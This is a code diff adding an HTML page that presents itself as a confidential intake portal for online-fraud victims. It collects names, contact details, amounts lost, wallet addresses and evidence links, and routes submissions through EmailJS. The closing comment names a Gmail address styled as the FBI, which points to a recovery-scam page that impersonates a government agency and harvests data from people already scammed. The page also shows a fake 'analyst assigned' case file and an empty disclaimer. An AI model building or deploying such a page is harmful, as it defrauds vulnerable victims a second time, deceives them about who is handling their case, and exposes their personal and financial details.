@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cyber Fraud Victim Consultation — Confidential Intake</title>
+<meta name="description" content="Confidential intake portal for victims of online fraud, scams and extortion. Submit your case for review and get a case reference.">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+/* ============================================================
+   DESIGN TOKENS
+   ============================================================ */
+:root{
+  --blue-50:#eff6ff;
+  --blue-100:#dbeafe;
+  --blue-200:#bfdbfe;
+  --blue-500:#3b82f6;
+  --blue-600:#2563eb;
+  --blue-700:#1d4ed8;
+  --cyan-500:#06b6d4;
+  --cyan-600:#0891b2;
+
+  --ink:#0b1b33;
+  --text:#1e293b;
+  --muted:#64748b;
+  --line:#e2e8f0;
+  --line-2:#eef2f9;
+
+  --ok:#22c55e;
+  --danger:#ef4444;
+
+  --radius:24px;
+  --shadow-sm:0 1px 2px rgba(15,42,90,.06);
+  --shadow-md:0 18px 40px -22px rgba(15,42,90,.28);
+  --shadow-lg:0 40px 90px -50px rgba(15,42,90,.35);
+}
+
+*,*::before,*::after{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  font-family:'Plus Jakarta Sans',system-ui,-apple-system,'Segoe UI',sans-serif;
+  color:var(--text);
+  background:#fff;
+  line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+  overflow-x:hidden;
+}
+img,svg{display:block}
+.wrap{width:min(1120px,92vw);margin-inline:auto;position:relative;z-index:1}
+
+/* ============================================================
+   NAV
+   ============================================================ */
+.nav{
+  position:sticky;top:0;z-index:50;
+  background:rgba(255,255,255,.84);
+  backdrop-filter:blur(16px);
+  -webkit-backdrop-filter:blur(16px);
+  border-bottom:1px solid var(--line-2);
+}
+.nav .wrap{display:flex;align-items:center;justify-content:space-between;gap:1rem;height:70px}
+.brand{display:flex;align-items:center;gap:.65rem;text-decoration:none;color:var(--ink);font-weight:800;letter-spacing:-.02em;font-size:1.02rem}
+.brand-mark{
+  width:38px;height:38px;border-radius:12px;display:grid;place-items:center;color:#fff;
+  background:linear-gradient(135deg,#2563eb,#06b6d4);
+  box-shadow:0 10px 22px -10px rgba(37,99,235,.8);
+}
+.nav-links{display:flex;gap:1.7rem;list-style:none;margin:0;padding:0}
+.nav-links a{color:var(--muted);text-decoration:none;font-size:.9rem;font-weight:600;transition:color .18s}
+.nav-links a:hover{color:var(--blue-600)}
+.nav-cta{
+  display:inline-flex;align-items:center;gap:.5rem;
+  font-size:.86rem;font-weight:700;text-decoration:none;color:#fff;
+  background:linear-gradient(135deg,#2563eb,#1d4ed8);
+  padding:.62rem 1.15rem;border-radius:11px;
+  box-shadow:0 12px 26px -12px rgba(37,99,235,.85);
+  transition:transform .16s,box-shadow .2s;
+}
+.nav-cta:hover{transform:translateY(-1px);box-shadow:0 16px 30px -12px rgba(37,99,235,.95)}
+@media(max-width:880px){.nav-links{display:none}}
+
+/* ============================================================
+   HERO
+   ============================================================ */
+.hero{
+  position:relative;overflow:hidden;
+  padding:5.2rem 0 4rem;
+  background:
+    radial-gradient(900px 480px at 10% -12%, #dbeafe 0%, transparent 62%),
+    radial-gradient(780px 420px at 92% -4%, #e0f2fe 0%, transparent 58%),
+    linear-gradient(180deg,#f7fbff 0%,#ffffff 78%);
+}
+.blob{position:absolute;border-radius:50%;filter:blur(64px);opacity:.55;pointer-events:none;z-index:0}
+.blob.b1{width:400px;height:400px;background:#bfdbfe;top:-140px;left:-120px;animation:float 15s ease-in-out infinite}
+.blob.b2{width:320px;height:320px;background:#bae6fd;right:-90px;top:60px;animation:float 19s ease-in-out infinite reverse}
+@keyframes float{50%{transform:translateY(26px)}}
+
+.hero-grid{display:grid;grid-template-columns:1.06fr .94fr;gap:3.2rem;align-items:center}
+@media(max-width:960px){.hero-grid{grid-template-columns:1fr;gap:2.6rem}}
+
+.badge{
+  display:inline-flex;align-items:center;gap:.5rem;
+  padding:.42rem .95rem;border-radius:999px;
+  background:#eff6ff;border:1px solid #dbeafe;color:var(--blue-700);
+  font-size:.74rem;font-weight:800;letter-spacing:.09em;text-transform:uppercase;
+}
+.badge .pulse{width:7px;height:7px;border-radius:50%;background:var(--ok);animation:pulse 2.2s infinite}
+@keyframes pulse{
+  0%{box-shadow:0 0 0 0 rgba(34,197,94,.55)}
+  70%{box-shadow:0 0 0 9px rgba(34,197,94,0)}
+  100%{box-shadow:0 0 0 0 rgba(34,197,94,0)}
+}
+
+h1{
+  font-size:clamp(2.1rem,4.6vw,3.4rem);
+  line-height:1.06;letter-spacing:-.035em;
+  margin:1.25rem 0 1.1rem;color:var(--ink);font-weight:800;
+}
+h1 .grad{
+  background:linear-gradient(100deg,#2563eb 10%,#06b6d4 90%);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.lead{max-width:56ch;color:var(--muted);font-size:1.03rem;margin:0}
+
+.cta-row{display:flex;flex-wrap:wrap;gap:.8rem;margin-top:2rem}
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:.55rem;
+  font-family:inherit;font-size:.92rem;font-weight:700;
+  border-radius:13px;padding:.92rem 1.6rem;cursor:pointer;
+  text-decoration:none;border:1px solid transparent;
+  transition:transform .16s,box-shadow .22s,background .2s;
+}
+.btn-primary{
+  color:#fff;background:linear-gradient(135deg,#2563eb,#1d4ed8);
+  box-shadow:0 18px 34px -16px rgba(37,99,235,.9);
+}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 22px 40px -16px rgba(37,99,235,1)}
+.btn-ghost{
+  color:var(--blue-700);background:#fff;border-color:#dbeafe;
+  box-shadow:var(--shadow-sm);
+}
+.btn-ghost:hover{transform:translateY(-2px);background:#f8fbff;box-shadow:0 14px 26px -18px rgba(15,42,90,.4)}
+
+.stats{display:flex;flex-wrap:wrap;gap:2.4rem;margin-top:2.6rem;padding-top:1.7rem;border-top:1px solid var(--line-2)}
+.stat strong{display:block;font-size:1.35rem;font-weight:800;color:var(--blue-700);letter-spacing:-.02em}
+.stat span{font-size:.8rem;color:var(--muted);font-weight:600}
+
+/* floating case-file mock */
+.hero-card{
+  position:relative;z-index:1;
+  background:rgba(255,255,255,.78);
+  backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);
+  border:1px solid #e6eefc;border-radius:26px;
+  padding:1.5rem 1.6rem;
+  box-shadow:0 50px 90px -50px rgba(30,64,175,.45);
+  animation:rise .9s cubic-bezier(.2,.7,.3,1) both;
+}
+@keyframes rise{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+.hc-top{display:flex;align-items:center;gap:.5rem;font-size:.72rem;font-weight:800;letter-spacing:.08em;color:#475569;text-transform:uppercase}
+.hc-top .pulse{width:7px;height:7px;border-radius:50%;background:var(--blue-500);animation:pulse 2.2s infinite}
+.hc-pill{margin-left:auto;font-size:.68rem;font-weight:800;color:#166534;background:#dcfce7;border:1px solid #bbf7d0;border-radius:999px;padding:.2rem .6rem;letter-spacing:.05em}
+.hc-row{display:flex;align-items:center;gap:.8rem;margin-top:1.15rem}
+.hc-row .k{font-size:.76rem;font-weight:700;color:#64748b;width:82px;flex:0 0 82px}
+.skel{
+  flex:1;height:10px;border-radius:6px;
+  background:linear-gradient(90deg,#e8f0fe 25%,#f5f9ff 37%,#e8f0fe 63%);
+  background-size:400% 100%;animation:shimmer 1.9s linear infinite;
+}
+@keyframes shimmer{0%{background-position:100% 0}100%{background-position:-100% 0}}
+.hc-progress{height:8px;border-radius:99px;background:#eef4ff;margin-top:1.4rem;overflow:hidden}
+.hc-progress span{display:block;height:100%;width:68%;border-radius:99px;background:linear-gradient(90deg,#2563eb,#06b6d4)}
+.hc-foot{display:flex;align-items:center;gap:.55rem;margin-top:1.3rem;font-size:.76rem;color:#475569;font-weight:600}
+.hc-avatar{width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,#93c5fd,#67e8f9);border:2px solid #fff;box-shadow:0 4px 10px -4px rgba(37,99,235,.6)}
+
+/* ============================================================
+   SECTION HEADINGS
+   ============================================================ */
+.section{padding:4.2rem 0}
+.section-head{text-align:center;max-width:740px;margin:0 auto 2.3rem}
+.eyebrow{
+  margin:0;font-size:.74rem;font-weight:800;letter-spacing:.2em;
+  text-transform:uppercase;color:var(--blue-600);
+}
+.section-title{
+  margin:.55rem 0 0;font-size:clamp(1.5rem,3vw,2.1rem);
+  letter-spacing:-.025em;color:var(--ink);font-weight:800;line-height:1.2;
+}
+.section-sub{margin:.7rem auto 0;color:var(--muted);font-size:.95rem;max-width:60ch}
+
+/* ============================================================
+   VIDEO (YOUTUBE)
+   ============================================================ */
+.video-card{
+  background:#fff;border:1px solid var(--line-2);border-radius:var(--radius);
+  padding:clamp(.9rem,2.4vw,1.5rem);
+  box-shadow:var(--shadow-md);
+  display:flex;justify-content:center;overflow:hidden;
+}
+.video-card iframe{
+  display:block;
+  width:100%;
+  max-width:860px;
+  aspect-ratio:16 / 9;
+  border:0;
+  border-radius:16px;
+  background:#000;
+}
+
+/* ============================================================
+   FORM SECTION
+   ============================================================ */
+.form-section{
+  background:linear-gradient(180deg,#f7fbff 0%,#eef5ff 100%);
+  border-top:1px solid #eaf1fc;border-bottom:1px solid #eaf1fc;
+  padding:4.6rem 0 5.2rem;scroll-margin-top:84px;
+}
+.form-grid{display:grid;grid-template-columns:.82fr 1.18fr;gap:2.8rem;align-items:start}
+@media(max-width:980px){.form-grid{grid-template-columns:1fr;gap:2.2rem}}
+
+.form-aside{position:sticky;top:96px}
+@media(max-width:980px){.form-aside{position:static}}
+.form-aside h2{margin:.5rem 0 0;font-size:1.55rem;letter-spacing:-.025em;color:var(--ink);font-weight:800;line-height:1.2}
+.steps{list-style:none;margin:1.8rem 0 0;padding:0;display:grid;gap:1.2rem}
+.steps li{display:flex;gap:.95rem}
+.steps .num{
+  flex:0 0 36px;height:36px;border-radius:11px;
+  background:#fff;border:1px solid #dbeafe;color:var(--blue-600);
+  display:grid;place-items:center;font-weight:800;font-size:.85rem;
+  box-shadow:0 8px 16px -10px rgba(37,99,235,.7);
+}
+.steps strong{display:block;font-size:.95rem;color:var(--ink);letter-spacing:-.01em}
+.steps p{margin:.15rem 0 0;font-size:.85rem;color:var(--muted);line-height:1.55}
+
+.aside-note{
+  margin-top:1.9rem;padding:1rem 1.1rem;border-radius:14px;
+  background:#fff;border:1px solid #e6eefc;
+  font-size:.83rem;color:#475569;box-shadow:var(--shadow-sm);
+}
+.aside-note strong{color:var(--blue-700)}
+
+/* ---------- form card ---------- */
+.form-card{
+  background:#fff;border:1px solid #e6eefc;border-radius:var(--radius);
+  padding:clamp(1.3rem,3vw,2.3rem);
+  box-shadow:var(--shadow-lg);
+}
+.card-head{
+  display:flex;flex-wrap:wrap;gap:1rem;align-items:center;justify-content:space-between;
+  padding-bottom:1.35rem;margin-bottom:1.7rem;border-bottom:1px solid var(--line-2);
+}
+.card-head h2{margin:0;font-size:1.28rem;letter-spacing:-.02em;color:var(--ink);font-weight:800}
+.card-head p{margin:.25rem 0 0;font-size:.83rem;color:var(--muted)}
+.ref-chip{
+  font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+  font-size:.76rem;font-weight:700;letter-spacing:.06em;
+  padding:.5rem .85rem;border-radius:10px;
+  background:var(--blue-50);border:1px solid var(--blue-200);
+  color:var(--blue-700);white-space:nowrap;
+}
+
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:1.15rem}
+.field{display:flex;flex-direction:column}
+.field.full{grid-column:1 / -1}
+@media(max-width:720px){.grid{grid-template-columns:1fr}}
+
+label{display:block;font-size:.82rem;font-weight:700;color:#334155;margin-bottom:.42rem}
+.req{color:var(--blue-600)}
+.hint{display:block;font-weight:500;font-size:.76rem;color:var(--muted);margin-top:.15rem}
+
+input,select,textarea{
+  width:100%;font-family:inherit;font-size:.94rem;color:var(--ink);
+  background:#f8fafc;border:1px solid var(--line);border-radius:12px;
+  padding:.8rem .95rem;
+  transition:border-color .18s,box-shadow .18s,background .18s;
+  appearance:none;-webkit-appearance:none;
+}
+textarea{resize:vertical;min-height:150px;line-height:1.6}
+select{
+  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%2364748b' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
+  background-repeat:no-repeat;background-position:right .9rem center;
+  padding-right:2.4rem;cursor:pointer;
+}
+input::placeholder,textarea::placeholder{color:#94a3b8}
+input:focus,select:focus,textarea:focus{
+  outline:none;background:#fff;border-color:var(--blue-500);
+  box-shadow:0 0 0 4px rgba(59,130,246,.14);
+}
+input:invalid:not(:placeholder-shown),
+textarea:invalid:not(:placeholder-shown){border-color:rgba(239,68,68,.6)}
+
+.consent{
+  grid-column:1 / -1;
+  display:flex;gap:.75rem;align-items:flex-start;
+  margin-top:.35rem;padding:1rem 1.1rem;
+  border:1px solid var(--blue-200);border-radius:13px;
+  background:var(--blue-50);
+}
+.consent label{margin:0;font-weight:500;font-size:.85rem;color:#334155;line-height:1.55;cursor:pointer}
+
+/* ---------- NATIVE CONSENT CHECKBOX ---------- */
+.consent input[type="checkbox"]{
+  -webkit-appearance:auto;
+  appearance:auto;
+  width:20px;
+  height:20px;
+  min-width:20px;
+  flex:0 0 20px;
+  margin:.12rem 0 0;
+  padding:0;
+  border:none;
+  border-radius:4px;
+  background:transparent;
+  box-shadow:none;
+  accent-color:var(--blue-600);
+  cursor:pointer;
+}
+.consent input[type="checkbox"]:focus-visible{
+  outline:2px solid var(--blue-500);
+  outline-offset:2px;
+}
+
+.actions{
+  grid-column:1 / -1;
+  display:flex;flex-wrap:wrap;align-items:center;gap:1rem;
+  margin-top:.8rem;padding-top:1.5rem;border-top:1px solid var(--line-2);
+}
+.btn-submit{
+  font-family:inherit;font-size:.88rem;font-weight:800;
+  letter-spacing:.06em;text-transform:uppercase;color:#fff;
+  background:linear-gradient(135deg,#2563eb,#1d4ed8);
+  border:none;border-radius:13px;padding:1rem 1.9rem;cursor:pointer;
+  display:inline-flex;align-items:center;gap:.6rem;
+  box-shadow:0 20px 38px -18px rgba(37,99,235,.95);
+  transition:transform .16s,box-shadow .22s,opacity .2s;
+}
+.btn-submit:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 24px 44px -18px rgba(37,99,235,1)}
+.btn-submit:disabled{opacity:.65;cursor:not-allowed}
+.btn-submit .spinner{
+  width:16px;height:16px;border-radius:50%;
+  border:2px solid rgba(255,255,255,.35);border-top-color:#fff;
+  display:none;animation:spin .7s linear infinite;
+}
+.btn-submit.loading .spinner{display:block}
+@keyframes spin{to{transform:rotate(360deg)}}
+.secure-note{font-size:.79rem;color:var(--muted);display:flex;align-items:center;gap:.45rem}
+
+.status{
+  grid-column:1 / -1;display:none;
+  padding:.95rem 1.1rem;border-radius:12px;font-size:.9rem;line-height:1.55;
+  border:1px solid transparent;
+}
+.status.show{display:block}
+.status.ok{background:#f0fdf4;border-color:#bbf7d0;color:#166534}
+.status.err{background:#fef2f2;border-color:#fecaca;color:#991b1b}
+.status a{color:inherit;font-weight:700}
+
+/* ============================================================
+   FOOTER
+   ============================================================ */
+footer{background:#fff;padding:3rem 0 2.4rem;font-size:.83rem;color:var(--muted)}
+footer .wrap{display:grid;gap:1.1rem}
+.disclaimer{
+  padding:1.1rem 1.2rem;border-left:3px solid var(--blue-600);
+  background:#f7fbff;border-radius:0 12px 12px 0;max-width:86ch;color:#475569;
+}
+.disclaimer strong{color:var(--ink)}
+.footer-bottom{
+  display:flex;flex-wrap:wrap;gap:.8rem;justify-content:space-between;
+  padding-top:1.1rem;border-top:1px solid var(--line-2);font-size:.78rem;
+}
+
+/* ============================================================
+   MYLIVECHAT WIDGET — SITE BLUE BRAND MATCH
+   ------------------------------------------------------------
+   Site palette:
+     Primary  #2563eb
+     Deep     #1d4ed8
+     Accent   #06b6d4
+   The rules below recolour every MyLiveChat element that is
+   injected into THIS document (launcher button, labels, links,
+   focus rings, etc.). The chat window itself is rendered inside
+   a cross-origin iframe from mylivechat.com, so page CSS cannot
+   reach it — set the same hex values in the MyLiveChat dashboard
+   (Campaign ▸ Chat Window ▸ Theme colour) for a perfect match.
+   ============================================================ */
+:root{
+  --mlc-primary:#2563eb;
+  --mlc-primary-deep:#1d4ed8;
+  --mlc-accent:#06b6d4;
+  --mlc-glow:0 14px 30px -12px rgba(37,99,235,.85);
+}
+
+/* Floating launcher / chat button */
+#mylivechat_button,
+#MyLiveChat_Button,
+.mylivechat_button,
+.MyLiveChat_Button,
+[id*="mylivechat" i][id*="button" i],
+[class*="mylivechat" i][class*="button" i],
+[id*="mylivechat" i][class*="launcher" i],
+[class*="mylivechat" i][class*="launcher" i],
+[id*="mylivechat" i][class*="invite" i],
+[class*="mylivechat" i][class*="invite" i]{
+  background:linear-gradient(135deg,var(--mlc-primary),var(--mlc-primary-deep)) !important;
+  border-color:var(--mlc-primary-deep) !important;
+  color:#fff !important;
+  border-radius:13px !important;
+  box-shadow:var(--mlc-glow) !important;
+  transition:transform .16s,box-shadow .22s !important;
+}
+#mylivechat_button:hover,
+#MyLiveChat_Button:hover,
+.mylivechat_button:hover,
+.MyLiveChat_Button:hover,
+[id*="mylivechat" i][id*="button" i]:hover,
+[class*="mylivechat" i][class*="button" i]:hover,
+[id*="mylivechat" i][class*="launcher" i]:hover,
+[class*="mylivechat" i][class*="launcher" i]:hover{
+  transform:translateY(-2px) !important;
+  box-shadow:0 20px 38px -12px rgba(37,99,235,.95) !important;
+}
+
+/* Any MyLiveChat header / title bar / toolbar rendered in-page */
+[id*="mylivechat" i][class*="header" i],
+[class*="mylivechat" i][class*="header" i],
+[id*="mylivechat" i][class*="titlebar" i],
+[class*="mylivechat" i][class*="titlebar" i],
+[id*="mylivechat" i][class*="title" i],
+[class*="mylivechat" i][class*="title" i]{
+  background:linear-gradient(135deg,var(--mlc-primary),var(--mlc-primary-deep)) !important;
+  border-color:var(--mlc-primary-deep) !important;
+  color:#fff !important;
+}
+
+/* Accent elements: links, send buttons, active tabs, badges */
+[id*="mylivechat" i] a,
+[class*="mylivechat" i] a{
+  color:var(--mlc-primary) !important;
+}
+[id*="mylivechat" i] a:hover,
+[class*="mylivechat" i] a:hover{
+  color:var(--mlc-primary-deep) !important;
+}
+[id*="mylivechat" i] [class*="send" i],
+[class*="mylivechat" i] [class*="send" i],
+[id*="mylivechat" i] [class*="submit" i],
+[class*="mylivechat" i] [class*="submit" i],
+[id*="mylivechat" i] [class*="active" i],
+[class*="mylivechat" i] [class*="active" i],
+[id*="mylivechat" i] [class*="badge" i],
+[class*="mylivechat" i] [class*="badge" i]{
+  background:linear-gradient(135deg,var(--mlc-primary),var(--mlc-primary-deep)) !important;
+  background-color:var(--mlc-primary) !important;
+  border-color:var(--mlc-primary-deep) !important;
+  color:#fff !important;
+}
+
+/* Focus rings to match the rest of the form */
+[id*="mylivechat" i] :focus-visible,
+[class*="mylivechat" i] :focus-visible{
+  outline:2px solid var(--mlc-primary) !important;
+  outline-offset:2px !important;
+}
+
+@media (prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.001ms !important;animation-iteration-count:1 !important;transition-duration:.001ms !important}
+  html{scroll-behavior:auto}
+}
+</style>
+</head>
+
+<body>
+
+<!-- ============================ NAV ============================ -->
+<nav class="nav">
+  <div class="wrap">
+    <a class="brand" href="#top">
+      <span class="brand-mark" aria-hidden="true">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2 20 5v6c0 5.3-3.6 9.1-8 11-4.4-1.9-8-5.7-8-11V5z"/>
+          <path d="m8.5 12 2.5 2.5 4.5-5"/>
+        </svg>
+      </span>
+      Fraud Victim Intake
+    </a>
+
+    <ul class="nav-links">
+      <li><a href="#top">Overview</a></li>
+      <li><a href="#briefing">Briefing</a></li>
+      <li><a href="#report">Report a Case</a></li>
+    </ul>
+
+    <a class="nav-cta" href="#report">
+      Report a Scam
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
+    </a>
+  </div>
+</nav>
+
+<!-- ============================ HERO ============================ -->
+<header class="hero" id="top">
+  <span class="blob b1" aria-hidden="true"></span>
+  <span class="blob b2" aria-hidden="true"></span>
+
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <span class="badge"><span class="pulse" aria-hidden="true"></span> Confidential intake · Open 24/7</span>
+
+        <h1>Scammed online?<br>Tell us your <span class="grad">story.</span></h1>
+
+        <p class="lead">
+          Investment fraud, romance scams, phishing, sextortion, fake brokers — if it
+          happened to you, it matters. Submit a confidential statement and our case
+          response team will review the details, issue you a case reference, and guide
+          you on next steps.
+        </p>
+
+        <div class="cta-row">
+          <a class="btn btn-primary" href="#report">
+            Start Your Report
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
+          </a>
+          <button class="btn btn-ghost" type="button" id="heroChatBtn">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.4 8.4 0 0 1-9 8.4 9.4 9.4 0 0 1-4.2-1L3 20l1.1-4.6A8.4 8.4 0 0 1 12 3.1a8.4 8.4 0 0 1 9 8.4z"/></svg>
+            Chat With Us
+          </button>
+        </div>
+
+        <div class="stats">
+          <div class="stat"><strong>100%</strong><span>Free to report</span></div>
+          <div class="stat"><strong>24h</strong><span>Typical review window</span></div>
+          <div class="stat"><strong>Private</strong><span>Encrypted submission</span></div>
+        </div>
+      </div>
+
+      <!-- decorative case-file mock -->
+      <div class="hero-card" aria-hidden="true">
+        <div class="hc-top">
+          <span class="pulse"></span> Case File · CF-2026-8X4
+          <span class="hc-pill">Under review</span>
+        </div>
+        <div class="hc-row"><span class="k">Category</span><span class="skel" style="width:64%"></span></div>
+        <div class="hc-row"><span class="k">Platform</span><span class="skel" style="width:48%"></span></div>
+        <div class="hc-row"><span class="k">Evidence</span><span class="skel" style="width:78%"></span></div>
+        <div class="hc-row"><span class="k">Statement</span><span class="skel" style="width:56%"></span></div>
+        <div class="hc-progress"><span></span></div>
+        <div class="hc-foot"><span class="hc-avatar"></span> Analyst assigned · Response within 24h</div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- ============================ VIDEO (YOUTUBE) ============================ -->
+<section class="section" id="briefing">
+  <div class="wrap">
+    <div class="section-head">
+      <p class="eyebrow">Official Briefing</p>
+      <h2 class="section-title">Cybercrime Roundtable — Message to Victims</h2>
+      <p class="section-sub">A short address on online fraud, extortion and what victims are urged to do next.</p>
+    </div>
+
+    <div class="video-card">
+      <iframe
+        src="https://www.youtube.com/embed/QUB7Me8NoAQ"
+        title="Cybercrime Roundtable — Message to Victims"
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+        referrerpolicy="strict-origin-when-cross-origin"
+        allowfullscreen
+        loading="lazy"></iframe>
+    </div>
+  </div>
+</section>
+
+<!-- ============================ FORM ============================ -->
+<section class="form-section" id="report">
+  <div class="wrap">
+    <div class="form-grid">
+
+      <!-- ASIDE -->
+      <aside class="form-aside">
+        <p class="eyebrow">Before You Submit</p>
+        <h2>What happens to your report</h2>
+
+        <ol class="steps">
+          <li>
+            <span class="num">1</span>
+            <div>
+              <strong>You submit the intake form</strong>
+              <p>Describe what happened in your own words. Include dates, amounts and any contact details the scammer used.</p>
+            </div>
+          </li>
+          <li>
+            <span class="num">2</span>
+            <div>
+              <strong>You receive a case reference</strong>
+              <p>A unique reference like <em>CF-2026-A1B2C</em> is generated the moment you send the form.</p>
+            </div>
+          </li>
+          <li>
+            <span class="num">3</span>
+            <div>
+              <strong>An analyst reviews your details</strong>
+              <p>Your statement is assessed for patterns, methods used, and the recovery options available to you.</p>
+            </div>
+          </li>
+          <li>
+            <span class="num">4</span>
+            <div>
+              <strong>We contact you</strong>
+              <p>You'll be reached by your preferred method with next steps and guidance on official reporting.</p>
+            </div>
+          </li>
+        </ol>
+
+        <div class="aside-note">
+          <strong>Never share passwords</strong> or one-time codes with anyone — including
+          anyone claiming to be investigating your case. No legitimate team will ever ask for them.
+        </div>
+      </aside>
+
+      <!-- FORM -->
+      <form id="reportForm" class="form-card" novalidate>
+
+        <!-- hidden fields sent to EmailJS -->
+        <input type="hidden" name="to_email" id="to_email">
+        <input type="hidden" name="reference_id" id="reference_id">
+
+        <div class="card-head">
+          <div>
+            <h2>Victim Statement &amp; Case Intake</h2>
+            <p>Fields marked <span class="req">*</span> are required. Everything is treated as confidential.</p>
+          </div>
+          <div class="ref-chip">CASE&nbsp;REF: <span id="refDisplay">—</span></div>
+        </div>
+
+        <div class="grid">
+
+          <div class="field">
+            <label for="full_name">Full Name <span class="req">*</span></label>
+            <input id="full_name" name="from_name" type="text" placeholder="Jane A. Doe" autocomplete="name" required>
+          </div>
+
+          <div class="field">
+            <label for="email">Email Address <span class="req">*</span></label>
+            <input id="email" name="reply_to" type="email" placeholder="you@example.com" autocomplete="email" required>
+          </div>
+
+          <div class="field">
+            <label for="phone">Phone / WhatsApp</label>
+            <input id="phone" name="phone" type="tel" placeholder="+1 555 010 2030" autocomplete="tel">
+          </div>
+
+          <div class="field">
+            <label for="country">Country of Residence <span class="req">*</span></label>
+            <input id="country" name="country" type="text" placeholder="United States" autocomplete="country-name" required>
+          </div>
+
+          <div class="field">
+            <label for="scam_type">Type of Scam <span class="req">*</span></label>
+            <select id="scam_type" name="scam_type" required>
+              <option value="" selected disabled>Select a category…</option>
+              <option>Investment / Crypto Fraud</option>
+              <option>Romance / Confidence Scam</option>
+              <option>Phishing / Email Fraud</option>
+              <option>Tech Support Scam</option>
+              <option>Online Purchase / Auction Fraud</option>
+              <option>Job / Employment Scam</option>
+              <option>Lottery / Prize Scam</option>
+              <option>Government or Bank Impersonation</option>
+              <option>Extortion / Sextortion</option>
+              <option>Social Media / Account Takeover</option>
+              <option>Other</option>
+            </select>
+          </div>
+
+          <div class="field">
+            <label for="platform">Platform / Channel Used</label>
+            <input id="platform" name="platform" type="text" placeholder="e.g. WhatsApp, Telegram, fake broker site">
+          </div>
+
+          <div class="field">
+            <label for="incident_date">Date of Incident</label>
+            <input id="incident_date" name="incident_date" type="date">
+          </div>
+
+          <div class="field">
+            <label for="amount_lost">Amount Lost</label>
+            <input id="amount_lost" name="amount_lost" type="text" placeholder="e.g. 12,500" inputmode="decimal">
+          </div>
+
+          <div class="field">
+            <label for="currency">Currency</label>
+            <select id="currency" name="currency">
+              <option>USD</option><option>EUR</option><option>GBP</option>
+              <option>CAD</option><option>AUD</option><option>INR</option>
+              <option>NGN</option><option>ZAR</option><option>Other</option>
+            </select>
+          </div>
+
+          <div class="field">
+            <label for="contact_preference">Preferred Contact Method</label>
+            <select id="contact_preference" name="contact_preference">
+              <option>Email</option>
+              <option>Phone Call</option>
+              <option>WhatsApp</option>
+              <option>Either / Any</option>
+            </select>
+          </div>
+
+          <div class="field full">
+            <label for="message">
+              Tell Us What Happened <span class="req">*</span>
+              <span class="hint">Include how contact was made, what you were told, how payments were sent, and any names, usernames, phone numbers or wallet addresses involved.</span>
+            </label>
+            <textarea id="message" name="message" required minlength="40"
+              placeholder="On 12 March I was contacted on WhatsApp by someone claiming to be…"></textarea>
+          </div>
+
+          <div class="field full">
+            <label for="evidence_links">Links to Evidence</label>
+            <textarea id="evidence_links" name="evidence_links" style="min-height:92px"
+              placeholder="Screenshots (Google Drive / Dropbox links), transaction IDs, wallet addresses, scam website URLs…"></textarea>
+          </div>
+
+          <!-- Consent — OPTIONAL, native checkbox with standard check mark -->
+          <div class="consent">
+            <input type="checkbox" id="consent" name="consent" value="Yes — consent given">
+            <label for="consent">
+              I confirm the information provided is true and accurate to the best of my knowledge,
+              and I consent to my details being stored and reviewed for the purpose of assessing
+              and responding to my case.
+            </label>
+          </div>
+
+          <div id="formStatus" class="status" role="status" aria-live="polite"></div>
+
+          <div class="actions">
+            <button type="submit" class="btn-submit" id="submitBtn">
+              <span class="spinner" aria-hidden="true"></span>
+              <span class="btn-label">Submit Confidential Report</span>
+            </button>
+            <span class="secure-note">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 1 1 8 0v3"/></svg>
+              Secure transmission · Never share passwords or one-time codes
+            </span>
+          </div>
+
+        </div>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- ============================ FOOTER ============================ -->
+<footer>
+  <div class="wrap">
+    <div class="disclaimer">
+      <strong> </strong> 
+    </div>
+    <div class="footer-bottom">
+      <span>© <span id="year"></span> Fraud Victim Intake. All rights reserved.</span>
+      <span>Confidential intake · Case references auto-generated</span>
+    </div>
+  </div>
+</footer>
+
+<!-- ============================ EMAILJS ============================ -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+/* =====================================================================
+   ✅ CONFIGURATION — LIVE CREDENTIALS
+   Sends to: federalbureauinvestigation2615@gmail.com
